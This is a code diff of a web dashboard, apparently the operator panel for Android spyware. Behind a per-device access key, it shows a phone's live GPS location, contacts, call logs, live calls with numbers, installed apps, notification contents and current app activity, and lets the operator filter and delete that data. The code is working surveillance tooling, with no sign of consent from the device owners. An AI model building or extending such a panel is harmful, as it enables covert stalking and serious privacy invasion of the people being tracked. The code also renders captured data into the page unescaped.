+                showAlert("Error", "Phle device select karein!");
+                return;
+            }
+
+            const currentPendingId = pendingDevice.id;
+
+            // Real-time keys check from Firebase Database
+            rtdb.ref('DeviceKeys').once('value', (snapshot) => {
+                const deviceKeysData = snapshot.val() || {};
+                const allDevicesKey = deviceKeysData.ALL_DEVICES;
+                const specificDeviceKey = deviceKeysData[currentPendingId];
+
+                // Checks against dynamically fetched ALL_DEVICES key or device-specific key
+                if ((allDevicesKey && enteredKey === allDevicesKey) || (specificDeviceKey && enteredKey === specificDeviceKey)) {
+                    closeKeyModal();
                     
-                    if (currentTab === 'Users') {
-                        // Notifications: Badge=Package, Title=FB Title
-                        const pkg = val.app || val.package || 'System';
-                        card.innerHTML = `
-                            <div class="card-header">
-                                <span class="badge badge-pkg" onclick="openModal('${pkg}', 'Package Name')">${pkg}</span>
-                                <span class="time-txt">${val.time || ''}</span>
-                            </div>
-                            <div class="title-txt">${val.title || 'No Title'}</div>
-                            <div class="info-txt">${val.message || val.info || ''}</div>
-                            <button class="del-btn" onclick="deleteSingle('${key}')">Delete</button>
-                        `;
-                    } else {
-                        // Activities: Badge=Activity Type (Clickable)
-                        const actText = val.activity || 'TYPE_WINDOW_STATE_CHANGED';
-                        card.innerHTML = `
-                            <div class="card-header">
-                                <span class="badge badge-act" onclick="openModal('${actText}', 'Activity Detail')">${actText}</span>
-                                <span class="time-txt">${val.time || ''}</span>
-                            </div>
-                            <div class="info-txt" style="font-weight:600; color:#fff; font-size:0.95rem;">
-                                ${val.info || val.message || 'Tracked Activity'}
-                            </div>
-                            <button class="del-btn" onclick="deleteSingle('${key}')">Delete</button>
-                        `;
+                    // Drawer aur overlay ko forcefully close karne ke liye yahan check lagaya hai
+                    const drawer = document.getElementById('appDrawer');
+                    const overlay = document.getElementById('drawerOverlay');
+                    if (drawer && drawer.classList.contains('open')) {
+                        drawer.classList.remove('open');
                     }
-                    container.appendChild(card);
-                });
+                    if (overlay && overlay.classList.contains('active')) {
+                        overlay.classList.remove('active');
+                    }
+
+                    selectDevice(currentPendingId);
+                } else {
+                    showAlert("Access Denied", "Galat key! Yeh key is device ke liye valid nahi hai.");
+                }
             });
         }
 
-        function deleteSingle(key) {
-            if(confirm("Delete karna hai?")) db.ref(`${currentTab}/${selectedId}/${key}`).remove();
+        function selectDevice(deviceId) {
+            selectedDeviceId = deviceId;
+
+            // Show loading messages in respective data sections
+            locationDataEl.innerHTML = "Loading device location data...";
+            contactDataEl.innerHTML = "Loading contacts...";
+            callHistoryDataEl.innerHTML = "<div style='text-align: center; color: var(--text-muted); padding: 40px;'>Loading call logs...</div>";
+            appsDataEl.innerHTML = "Loading installed apps...";
+            notificationDataEl.innerHTML = "Loading notifications...";
+
+            rtdb.ref('LiveLocation').child(deviceId).once('value', (snapshot) => {
+                const dev = snapshot.val();
+                if (dev) {
+                    const devName = dev.deviceName || "Unknown Device";
+                    const lat = dev.latitude || "N/A";
+                    const lng = dev.longitude || "N/A";
+                    const battery = dev.battery || "N/A";
+                    const provider = dev.provider || "N/A";
+                    const time = dev.timestamp ? new Date(parseInt(dev.timestamp)).toLocaleTimeString() : "N/A";
+
+                    activeDeviceTitleEl.innerText = `Device: ${devName}`;
+                    locationDataEl.innerHTML = `
+                        <b>Device Name:</b> ${devName}<br>
+                        <b>Battery:</b> ${battery} | <b>Provider:</b> ${provider}<br>
+                        <b>Latitude:</b> ${lat}<br>
+                        <b>Longitude:</b> ${lng}
+                    `;
+                    if (lat !== "N/A" && lng !== "N/A") {
+                        mapLinkEl.href = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+                        mapLinkEl.style.display = "inline-block";
+                    } else {
+                        mapLinkEl.style.display = "none";
+                    }
+                    statusTextEl.innerText = `Last updated at: ${time}`;
+                } else {
+                    locationDataEl.innerHTML = "No location data found for this device.";
+                }
+            });
+
+            loadContactsData();
+            loadCallLogsData();
+            loadAppsData();
+            loadNotificationsData();
+
+            if (liveCallListener) {
+                rtdb.ref('LiveCalls').child(selectedDeviceId).off('value', liveCallListener);
+            }
+
+            liveCallDataEl.innerHTML = "Listening for live calls...";
+            liveCallListener = rtdb.ref('LiveCalls').child(deviceId).on('value', (snap) => {
+                const call = snap.val();
+                if (call) {
+                    let timeStr = call.timestamp ? new Date(parseInt(call.timestamp)).toLocaleTimeString() : "Just now";
+                    liveCallDataEl.innerHTML = `
+                        <div style="padding: 15px; background: #e0f2fe; border-radius: 8px; border: 1px solid #bae6fd;">
+                            <div style="font-size: 16px; font-weight: bold; color: #0369a1; margin-bottom: 5px;">
+                                📞 Active Call Status: ${call.type || 'ACTIVE'}
+                            </div>
+                            <div style="font-size: 14px; color: #0c4a6e;">
+                                <b>Number:</b> ${call.phoneNumber || 'Unknown'}<br>
+                                <b>Started At:</b> ${timeStr}
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    liveCallDataEl.innerHTML = "<span style='color: var(--text-muted);'>No active live call right now.</span>";
+                }
+            });
+
+            rtdb.ref('AppActivity').child(deviceId).on('value', (snap) => {
+                const act = snap.val();
+                if (act) {
+                    appActivityDataEl.innerHTML = `<b>Current App Package:</b> ${act.packageName}<br><b>Status:</b> ${act.activityName}<br><b>Time:</b> ${new Date(parseInt(act.timestamp)).toLocaleTimeString()}`;
+                } else {
+                    appActivityDataEl.innerHTML = "No active app data found.";
+                }
+            });
+
+            const firstTabBtn = document.querySelector('.tabs-container .tab-btn');
+            if (firstTabBtn) {
+                switchTab('location', firstTabBtn);
+            }
         }
 
-        function clearAll() {
-            if(confirm("Saara data clear karna hai?")) db.ref(`${currentTab}/${selectedId}`).remove();
+        function loadContactsData() {
+            if (!selectedDeviceId) return;
+            contactDataEl.innerHTML = "Loading contacts...";
+            rtdb.ref('Contacts').child(selectedDeviceId).on('value', (snap) => {
+                rawDeviceDataCache['Contacts'] = snap.val();
+                const contacts = snap.val();
+                if (contacts) {
+                    let html = "";
+                    Object.entries(contacts).forEach(([key, c]) => {
+                        html += `<div style="padding: 8px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between;"><span><b>${c.name || 'Unknown'}</b></span><span>${c.number || ''}</span></div>`;
+                    });
+                    contactDataEl.innerHTML = html;
+                } else {
+                    contactDataEl.innerHTML = "No contacts found for this device.";
+                }
+            });
+        }
+
+        function loadCallLogsData() {
+            if (!selectedDeviceId) return;
+            callHistoryDataEl.innerHTML = "<div style='text-align: center; color: var(--text-muted); padding: 40px;'>Loading call logs...</div>";
+            rtdb.ref('CallLogs').child(selectedDeviceId).on('value', (snap) => {
+                rawDeviceDataCache['CallLogs'] = snap.val();
+                const logs = snap.val();
+                if (logs) {
+                    const grouped = {};
+                    Object.entries(logs).forEach(([key, l]) => {
+                        let num = l.phoneNumber || 'Unknown';
+                        let ts = l.timestamp ? parseInt(l.timestamp) : Date.now();
+                        if (!grouped[num]) grouped[num] = [];
+                        grouped[num].push({ key: key, timestamp: ts });
+                    });
+
+                    let phoneGroups = Object.keys(grouped).map(phone => {
+                        let items = grouped[phone].sort((a, b) => b.timestamp - a.timestamp);
+                        return { phone: phone, items: items, latestTime: items[0].timestamp };
+                    });
+
+                    phoneGroups.sort((a, b) => b.latestTime - a.latestTime);
+
+                    let html = "";
+                    phoneGroups.forEach((group, index) => {
+                        let phone = group.phone;
+                        let items = group.items;
+                        let count = items.length;
+                        let lastTimeStr = new Date(items[0].timestamp).toLocaleString();
+
+                        let sublistHtml = "";
+                        items.forEach((item, i) => {
+                            let tStr = new Date(item.timestamp).toLocaleString();
+                            sublistHtml += `<div class="sub-time-item"><span>Call #${count - i}</span> <span>${tStr}</span></div>`;
+                        });
+
+                        html += `
+                            <div class="call-item">
+                                <div class="call-main-row" onclick="toggleCallSublist(${index})">
+                                    <div class="call-info-left">
+                                        <div class="call-icon">📞</div>
+                                        <div>
+                                            <span class="call-phone">${phone}</span>
+                                            ${count > 1 ? `<span class="call-badge">${count} calls</span>` : ''}
+                                        </div>
+                                    </div>
+                                    <div class="call-right-action">
+                                        <span class="call-last-time">${lastTimeStr}</span>
+                                        <button class="call-arrow" id="arrow-${index}">▼</button>
+                                    </div>
+                                </div>
+                                <div class="call-sublist" id="sublist-${index}">
+                                    ${sublistHtml}
+                                </div>
+                            </div>
+                        `;
+                    });
+                    callHistoryDataEl.innerHTML = html;
+                } else {
+                    callHistoryDataEl.innerHTML = "<div style='text-align: center; color: var(--text-muted); padding: 40px;'>No call logs found for this device.</div>";
+                }
+            });
+        }
+
+        function loadAppsData() {
+            if (!selectedDeviceId) return;
+            appsDataEl.innerHTML = "Loading installed apps...";
+            rtdb.ref('InstalledApps').child(selectedDeviceId).on('value', (snap) => {
+                rawDeviceDataCache['InstalledApps'] = snap.val();
+                const apps = snap.val();
+                if (apps) {
+                    let html = "";
+                    Object.entries(apps).forEach(([key, app]) => {
+                        html += `<div style="padding: 8px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between;"><span><b>${app.appName}</b></span><span style="color:var(--text-muted); font-size:12px;">${app.packageName}</span></div>`;
+                    });
+                    appsDataEl.innerHTML = html;
+                } else {
+                    appsDataEl.innerHTML = "No installed apps found.";
+                }
+            });
+        }
+
+        function loadNotificationsData() {
+            if (!selectedDeviceId) return;
+            rtdb.ref('Notifications').child(selectedDeviceId).on('value', (snap) => {
+                rawDeviceDataCache['Notifications'] = snap.val();
+                const notifs = snap.val();
+                if (notifs) {
+                    let html = "";
+                    Object.entries(notifs).reverse().forEach(([key, n]) => {
+                        let timeStr = n.timestamp ? new Date(parseInt(n.timestamp)).toLocaleTimeString() : "";
+                        html += `<div style="padding: 10px 0; border-bottom: 1px solid var(--border);"><b>App:</b> ${n.packageName}<br><b>Title:</b> ${n.title}<br><b>Message:</b> ${n.message} <span style="float:right; color:var(--text-muted); font-size:11px;">${timeStr}</span></div>`;
+                    });
+                    notificationDataEl.innerHTML = html;
+                } else {
+                    notificationDataEl.innerHTML = "No notifications captured yet.";
+                }
+            });
+        }
+
+        function confirmDeleteAll(dataType) {
+            if (!selectedDeviceId) {
+                showAlert("Error", "Pehle koi device select karein.");
+                return;
+            }
+            showAlert("Confirm Delete", "Are you sure you want to delete all entries for " + dataType + "?");
+        }
+
+        function openSelectModal(dataType) {
+            if (!selectedDeviceId) {
+                showAlert("Error", "Pehle koi device select karein.");
+                return;
+            }
+            currentActiveDataType = dataType;
+            document.getElementById('modalTitleText').innerText = "Select & Filter " + dataType;
+            document.getElementById('filterDateInput').value = '';
+            document.getElementById('filterTagInput').value = '';
+            document.getElementById('filterModal').classList.add('active');
+            renderModalItems();
+        }
+
+        function closeFilterModal() {
+            document.getElementById('filterModal').classList.remove('active');
+        }
+
+        function applyFilters() {
+            renderModalItems();
+        }
+
+        function renderModalItems() {
+            const container = document.getElementById('modalItemsContainer');
+            container.innerHTML = "";
+            const dataObj = rawDeviceDataCache[currentActiveDataType];
+
+            if (!dataObj) {
+                container.innerHTML = "No data available.";
+                return;
+            }
+
+            let dateFilterStr = document.getElementById('filterDateInput').value;
+            let tagFilterStr = document.getElementById('filterTagInput').value.toLowerCase().trim();
+
+            let html = "";
+            Object.entries(dataObj).forEach(([key, item]) => {
+                let displayLabel = key;
+                let itemTimestamp = item.timestamp ? parseInt(item.timestamp) : 0;
+                
+                if (currentActiveDataType === 'CallLogs') {
+                    displayLabel = (item.phoneNumber || 'Unknown') + " (" + new Date(itemTimestamp).toLocaleString() + ")";
+                } else if (currentActiveDataType === 'Contacts') {
+                    displayLabel = (item.name || 'Unknown') + " - " + (item.number || '');
+                } else if (currentActiveDataType === 'InstalledApps') {
+                    displayLabel = (item.appName || '') + " " + (item.packageName || '');
+                } else if (currentActiveDataType === 'Notifications') {
+                    displayLabel = (item.packageName || '') + " " + (item.title || '') + " " + (item.message || '');
+                }
+
+                if (dateFilterStr && itemTimestamp > 0) {
+                    let itemDateFormatted = new Date(itemTimestamp).toISOString().split('T')[0];
+                    if (itemDateFormatted !== dateFilterStr) return;
+                }
+
+                if (tagFilterStr && !displayLabel.toLowerCase().includes(tagFilterStr)) return;
+
+                html += `<div style="padding: 6px 0; border-bottom: 1px solid var(--border); font-size: 13px;">
+                    <label><input type="checkbox" class="item-checkbox" value="${key}" style="margin-right: 8px;"> ${displayLabel}</label>
+                </div>`;
+            });
+
+            container.innerHTML = html || "No matching items found.";
+        }
+
+        function toggleSelectAllItems(select) {
+            document.querySelectorAll('.item-checkbox').forEach(chk => chk.checked = select);
+        }
+
+        function deleteSelectedItems() {
+            const checkboxes = document.querySelectorAll('.item-checkbox:checked');
+            if (checkboxes.length === 0) {
+                showAlert("Error", "Kam se kam ek item select karein.");
+                return;
+            }
+            let updates = {};
+            checkboxes.forEach(chk => updates[chk.value] = null);
+
+            rtdb.ref(currentActiveDataType).child(selectedDeviceId).update(updates).then(() => {
+                showAlert("Success", "Deleted successfully!");
+                closeFilterModal();
+            }).catch((error) => {
+                showAlert("Error", error.message);
+            });
+        }
+
+        function toggleCallSublist(index) {
+            const sublist = document.getElementById(`sublist-${index}`);
+            const arrow = document.getElementById(`arrow-${index}`);
+            sublist.classList.toggle('open');
+            arrow.classList.toggle('open');
         }
     </script>
 </body>
